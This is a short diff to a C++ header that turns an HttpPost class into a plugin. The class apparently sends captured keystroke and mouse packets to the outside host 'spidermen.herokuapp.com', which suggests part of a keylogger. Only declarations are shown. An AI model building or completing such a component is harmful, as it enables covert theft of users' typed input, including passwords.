@@ -16,18 +16,19 @@
 # include "paquetMouse.hh"
 # include "paquetKeys.hh"
 # include "debug.hh"
+# include "IPlugin.hh"
 
 # define HOST_NAME	"spidermen.herokuapp.com"
 # define PAQUET_KEYS	"/paquet_keys"
 # define PAQUET_MOUSE	"/paquet_mouses"
 
-class			HttpPost
+class			HttpPost : public IPlugin
 {
 public:
   HttpPost();
-  ~HttpPost();
-  bool			postPaquet(PaquetKeys *paquet, const std::string &name);
-  bool			postPaquet(PaquetMouse *paquet, const std::string &name);
+  virtual ~HttpPost();
+  virtual bool			getKey(PaquetKeys *paquet, const std::string &name);
+  virtual bool			getMouse(PaquetMouse *paquet, const std::string &name);
 
 private:
   std::string		createRequest(PaquetKeys *paquet, const std::string &name);
